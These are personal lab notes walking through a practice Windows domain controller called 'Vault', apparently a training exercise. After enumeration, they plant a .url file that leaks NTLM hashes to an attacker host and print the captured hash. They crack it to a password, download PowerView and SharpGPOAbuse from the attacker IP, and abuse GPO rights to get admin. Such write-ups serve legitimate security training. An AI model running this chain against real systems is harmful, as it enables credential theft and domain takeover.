# Vault-Practice

Tags: AD-Win
Level: Hard
Tools: Responder, smbclient, pxexec
Status: Done
Date: April 21, 2024

### Nmap

```markdown
kali>nmap -A -T4 192.168.244.172 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-21 20:07 CDT
Nmap scan report for 192.168.244.172
Host is up (0.059s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-22 01:07:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-04-22T01:08:11+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2024-02-17T05:45:56
|_Not valid after:  2024-08-18T05:45:56
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-22T01:07:32+00:00
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-22T01:07:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.24 seconds
```

1.389 - LDAP - enumeration of LDAP, Extract system users, passwords

2.SMB - smbclient,enum4linux,smbclient

1.389 LDAP

```markdown
>nmap -sV --script "ldap* and not brute" 192.168.244.172 -Pn
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=vault,DC=offsec
|       ldapServiceName: vault.offsec:dc$@VAULT.OFFSEC
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=vault,DC=offsec
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vault,DC=offsec
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=vault,DC=offsec
|       namingContexts: DC=vault,DC=offsec
|       namingContexts: CN=Configuration,DC=vault,DC=offsec
|       namingContexts: CN=Schema,CN=Configuration,DC=vault,DC=offsec
|       namingContexts: DC=DomainDnsZones,DC=vault,DC=offsec
|       namingContexts: DC=ForestDnsZones,DC=vault,DC=offsec
|       isSynchronized: TRUE
|       highestCommittedUSN: 61514
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vault,DC=offsec
|       dnsHostName: DC.vault.offsec
|       defaultNamingContext: DC=vault,DC=offsec
|       currentTime: 20240422022949.0Z
|_      configurationNamingContext: CN=Configuration,DC=vault,DC=offsec
```

1. nmap -p139,445 --script=smb-enum-shares 192.168.244.172 -Pn -sC

Nothing result

enum4 linux - nothing 

smbclient - for DocumentsShare-Netpacket,psexec

```markdown
>smbclient -L //192.168.244.172/                                      
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        **DocumentsShare**  Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.244.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

>smbclient //192.168.244.172/DocumentsShare 
>dir (NO files founds)
#upload the files and delete files from the SMB
>sudo responder -I tun0 -v 
#No NTLM hash captured in in responder
kali>└─$ cat offsec.url
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\192.168.45.216\%USERNAME%.icon
IconIndex=1
>smbclient //192.168.244.172/DocumentsShare 
#in the responser got current user hash (anirudh::VAULT:42f2f44592f305d5:3752997F16E686D83489F354286042BF:0101000000000000004350763594DA011FCD509B4487414100000000020008003800570049004A0001001E00570049004E002D0052004200540043005A0056005500580059003800310004003400570049004E002D0052004200540043005A005600550058005900380031002E003800570049004A002E004C004F00430041004C00030014003800570049004A002E004C004F00430041004C00050014003800570049004A002E004C004F00430041004C0007000800004350763594DA0106000400020000000800300030000000000000000100000000200000F6C3E362186EAB3999D398F3282A4C3714E552228B22FE85E2C015FD1AB8398F0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310036000000000000000000)
#With the hash hydra, john
>└─$ john --wordlist=rockyou.txt vault_hash                                
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
SecureHM         (anirudh)     
1g 0:00:00:07 DONE (2024-04-21 21:58) 0.1297g/s 1376Kp/s 1376Kc/s 1376KC/s Seifer@14..Schsutar90
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
kali>evil-winrm -i 192.168.244.172 -u anirudh -p "SecureHM" (Logged In)
>whoami /priv (All the enabled)
>curl http://192.168.45.216:1234/powerview.ps1 -o .\powerview.ps1
>.\powerview.ps1
>Get-GPO -Name "Default Domain Policy" (31b2f340-016d-11d2-945f-00c04fb984f9)
>Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
Trustee     : anirudh
TrusteeType : User
Permission  : **GpoEditDeleteModifySecurity**
Inherited   : False
>curl http://192.168.45.216:1234/SharpGPOAbuse.exe -o .\SharpGPOAbuse.exe
>.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
>net user anirudh (User is not in admin group)
>net localgroup administrators
>gpupdate /force (updating Group Policies)
>net user anirudh (We are admin group)
>
>/usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.244.172

```

[https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0)